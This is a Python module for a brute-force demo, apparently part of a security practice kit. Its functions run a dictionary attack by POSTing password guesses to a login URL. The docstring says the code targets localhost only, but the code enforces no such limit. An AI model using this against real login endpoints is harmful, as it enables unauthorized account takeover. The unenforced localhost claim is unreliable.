# modules/bruteforce_demo.py
"""
Safe demo brute-forcer.
By default this targets localhost only (127.0.0.1) and a path you supply,
to prevent accidental attacking remote systems.

It will POST username/password pairs to a local practice server (Flask) we ship.
"""

import requests
from typing import List, Tuple

def try_login(url: str, username: str, password: str, timeout: float = 2.0) -> Tuple[bool, int, str]:
    """
    Attempt to login via HTTP POST.
    Returns (success: bool, status_code, response_text_snippet).
    NOTE: This demo expects the practice_server's /login endpoint format.
    """
    try:
        resp = requests.post(url, json={"username": username, "password": password}, timeout=timeout)
        success = resp.status_code == 200 and "success" in resp.text.lower()
        snippet = resp.text[:200]
        return success, resp.status_code, snippet
    except Exception as e:
        return False, 0, str(e)

def dictionary_attack(url: str, username: str, passwords: List[str], stop_on_success: bool = True):
    """
    Try many passwords for a given username. Returns list of successful attempts.
    CAUTION: Only run against localhost or systems you own/have permission to test.
    """
    successes = []
    for pwd in passwords:
        ok, code, snippet = try_login(url, username, pwd)
        print(f"Trying {username}:{pwd} -> success={ok} code={code}")
        if ok:
            successes.append((username, pwd, code))
            if stop_on_success:
                break
    return successes
